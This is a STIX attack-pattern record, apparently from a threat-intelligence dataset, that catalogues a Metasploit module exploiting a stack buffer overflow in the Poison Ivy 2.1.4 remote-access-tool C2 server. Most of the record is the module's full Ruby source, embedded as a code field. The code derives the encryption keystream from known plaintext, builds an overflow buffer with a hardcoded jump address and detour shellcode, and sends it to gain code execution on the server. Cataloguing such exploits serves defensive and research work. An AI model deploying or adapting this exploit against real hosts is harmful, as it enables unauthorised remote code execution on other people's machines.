{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d551f502-6cda-4389-962d-e119c1683efb",
    "created": "2024-08-14T16:46:40.444549Z",
    "modified": "2024-08-14T16:46:40.444553Z",
    "name": "Poison Ivy 2.1.x C2 Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the Poison Ivy 2.1.x C&C server. The exploit does not need to know the password chosen for the bot/server communication.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/poisonivy_21x_bof.rb",
            "external_id": "poisonivy_21x_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://samvartaka.github.io/exploitation/2016/06/03/dead-rats-exploiting-malware"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Poison Ivy 2.1.x C2 Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in the Poison Ivy 2.1.x C&C server.\n        The exploit does not need to know the password chosen for the bot/server communication.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jos Wetzels' # Vulnerability Discovery, exploit & Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'URL', 'http://samvartaka.github.io/exploitation/2016/06/03/dead-rats-exploiting-malware' ],\n        ],\n      'DisclosureDate' => '2016-06-03',\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'             => 0x847 # limited by amount of known plaintext (hard upper limit is 0xFFD)\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Poison Ivy 2.1.4 on Windows XP SP3',\n            {\n              'Ret' => 0x00469159, # jmp esp from \"Poison Ivy 2.1.4.exe\"\n              'StoreAddress' => 0x00520000, # .tls section address from \"Poison Ivy 2.1.4.exe\"\n              'InfoSizeOffset' => 0x1111, # offset of InfoSize variable\n              'DecompressSizeOffset' => 0x1109, # offset of DecompressSize variable\n              'Packet2Offset' => 0xB9E # offset of second packet within server's response\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(3460)\n      ])\n\n  end\n\n  # XOR two strings\n  def xor_strings(s1, s2)\n    s1.unpack('C*').zip(s2.unpack('C*')).map{ |a,b| a ^ b }.pack('C*')\n  end\n\n  # Obtain keystream using known plaintext\n  def get_keystream(ciphertext, knownPlaintext)\n    if(ciphertext.length < knownPlaintext.length)\n      return xor_strings(ciphertext, knownPlaintext[0, ciphertext.length])\n    else\n      return xor_strings(ciphertext, knownPlaintext)\n    end\n  end\n\n  # Apply keystream to plaintext\n  def use_keystream(plaintext, keyStream)\n    if(keyStream.length > plaintext.length)\n      return xor_strings(plaintext, keyStream[0, plaintext.length])\n    else\n      return xor_strings(plaintext, keyStream)\n    end\n  end\n\n  def check\n    connect\n    # Poke\n    sock.put(\"\\x01\")\n    # Fetch response\n    response = sock.get_once(6)\n\n    if (response == \"\\x89\\xFF\\x90\\x0B\\x00\\x00\")\n      vprint_status(\"Poison Ivy C&C version 2.1.4 detected.\")\n      return Exploit::CheckCode::Appears\n    elsif (response == \"\\x89\\xFF\\x38\\xE0\\x00\\x00\")\n      vprint_status(\"Poison Ivy C&C version 2.0.0 detected.\")\n      return Exploit::CheckCode::Safe\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  # Load known plaintext chunk\n  def load_c2_packet_chunk\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'poison_ivy_c2', 'chunk_214.bin')\n    chunk = ::File.open(path, 'rb') { |f| chunk = f.read }\n    chunk\n  end\n\n  def exploit\n    # Known plaintext from C2 packet\n    knownPlaintext1 = \"\\x89\\x00\\x69\\x0c\\x00\\x00\"\n    knownPlaintext2 = load_c2_packet_chunk()\n\n    # detour shellcode (mov eax, StoreAddress; jmp eax)\n    detourShellcode =  \"\\xB8\" + [target['StoreAddress']].pack(\"V\") # mov eax, StoreAddress\n    detourShellcode << \"\\xFF\\xE0\" # jmp eax\n\n    # Padding where necessary\n    compressedBuffer = payload.encoded + Rex::Text.rand_text_alpha(0xFFD - payload.encoded.length)\n\n    # Construct exploit buffer\n    exploitBuffer =  Rex::Text.rand_text_alpha(4)              # infoLen (placeholder)\n    exploitBuffer << compressedBuffer                          # compressedBuffer\n    exploitBuffer << \"\\xFF\" * 0x104                            # readfds\n    exploitBuffer << Rex::Text.rand_text_alpha(4)              # compressionType\n    exploitBuffer << Rex::Text.rand_text_alpha(4)              # decompressSize (placeholder)\n    exploitBuffer << Rex::Text.rand_text_alpha(4)              # pDestinationSize\n    exploitBuffer << Rex::Text.rand_text_alpha(4)              # infoSize (placeholder)\n    exploitBuffer << Rex::Text.rand_text_alpha(4)              # headerAllocSize\n    exploitBuffer << [target['StoreAddress']].pack(\"V\")        # decompressBuffer\n    exploitBuffer << Rex::Text.rand_text_alpha(4)              # decompressBuffer+4\n    exploitBuffer << Rex::Text.rand_text_alpha(4)              # lParam\n    exploitBuffer << Rex::Text.rand_text_alpha(4)              # timeout\n    exploitBuffer << Rex::Text.rand_text_alpha(4)              # hWnd\n    exploitBuffer << Rex::Text.rand_text_alpha(4)              # s\n    exploitBuffer << Rex::Text.rand_text_alpha(4)              # old EBP\n    exploitBuffer << [target['Ret']].pack(\"V\")    # EIP\n    exploitBuffer << [target['StoreAddress']].pack(\"V\")  # arg_0\n    exploitBuffer << detourShellcode # detour to storage area\n\n    # Calculate values\n    allocSize = exploitBuffer.length + 1024\n    infoLen = payload.encoded.length\n    infoSize = (infoLen + 4)\n\n    # Handshake\n    connect\n    print_status(\"Performing handshake...\")\n\n    # Poke\n    sock.put(\"\\x01\")\n\n    # Fetch response\n    response = sock.get(target['Packet2Offset'] + knownPlaintext1.length + infoSize)\n\n    eHeader = response[target['Packet2Offset'], 6]\n    eInfo = response[target['Packet2Offset'] + 10..-1]\n\n    if ((eHeader.length >= knownPlaintext1.length) and (knownPlaintext1.length >= 6) and (eInfo.length >= knownPlaintext2.length) and (knownPlaintext2.length >= infoSize))\n      # Keystream derivation using Known Plaintext Attack\n      keyStream1 = get_keystream(eHeader, knownPlaintext1)\n      keyStream2 = get_keystream(eInfo, knownPlaintext2)\n\n      # Set correct infoLen\n      exploitBuffer = [infoLen].pack(\"V\") + exploitBuffer[4..-1]\n\n      # Set correct decompressSize\n      exploitBuffer = exploitBuffer[0, target['DecompressSizeOffset']] + [infoSize].pack(\"V\") + exploitBuffer[(target['DecompressSizeOffset'] + 4)..-1]\n\n      # Build packet\n      malHeader = use_keystream(\"\\x89\\x01\" + [allocSize].pack(\"V\"), keyStream1)\n\n      # Encrypt infoSize bytes\n      encryptedExploitBuffer = use_keystream(exploitBuffer[0, infoSize], keyStream2) + exploitBuffer[infoSize..-1]\n\n      # Make sure infoSize gets overwritten properly since it is processed before decryption\n      encryptedExploitBuffer = encryptedExploitBuffer[0, target['InfoSizeOffset']] + [infoSize].pack(\"V\") + encryptedExploitBuffer[target['InfoSizeOffset']+4..-1]\n\n      # Finalize packet\n      exploitPacket = malHeader + [encryptedExploitBuffer.length].pack(\"V\") + encryptedExploitBuffer\n\n      print_status(\"Sending exploit...\")\n      # Send exploit\n      sock.put(exploitPacket)\n    else\n      print_status(\"Not enough keystream available...\")\n    end\n\n    select(nil,nil,nil,5)\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-06-03",
    "x_mitre_platforms": [
        "win'"
    ]
}